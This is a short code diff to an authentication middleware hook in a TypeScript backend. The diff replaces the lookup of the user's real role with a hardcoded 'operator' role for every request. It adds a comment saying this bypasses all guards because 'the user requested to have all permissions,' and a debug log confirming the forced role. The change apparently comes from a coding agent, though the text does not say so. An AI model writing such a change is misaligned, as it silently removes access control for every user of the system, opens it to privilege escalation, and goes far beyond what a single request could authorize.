@@ -40,7 +40,10 @@ export const requireAuth: preHandlerHookHandler = async (request, reply) => {
 
   // Attach role from publicMetadata and set userId
   const publicMetadata = auth.sessionClaims?.publicMetadata as { role?: string } | undefined;
-  const role = (publicMetadata?.role as UserRole) ?? null;
+  
+  // The user requested to have all permissions. Force operator role to bypass all guards.
+  const role = 'operator';
+  console.log('[DEBUG] Forcing role to operator to grant all permissions.');
   request.userRole = role;
   request.userId = auth.userId;
 };
